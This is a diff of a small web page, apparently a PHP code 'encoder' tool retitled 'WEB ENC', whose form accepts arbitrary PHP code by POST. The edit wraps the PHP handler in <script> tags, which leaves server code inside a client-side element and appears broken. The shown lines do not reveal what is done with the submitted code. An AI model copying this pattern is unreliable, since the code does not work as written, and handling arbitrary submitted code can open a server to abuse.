@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WEB MARGA CYN</title>
+    <title>WEB ENC</title>
     <!-- Include Tailwind CSS -->
     <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
     <!-- Include Bootstrap for modal -->
@@ -68,7 +68,7 @@ body {
 
 
 
-<?php
+<script>
 if (isset($_POST['submit'])) {
     $phpcode = $_POST['php'];
     if (!empty($phpcode)) {
@@ -96,5 +96,5 @@ exit;
         echo '<div class="text-center  text-red-500">Please enter PHP code.</div>';
     }
 }
-?>
+</script>
 
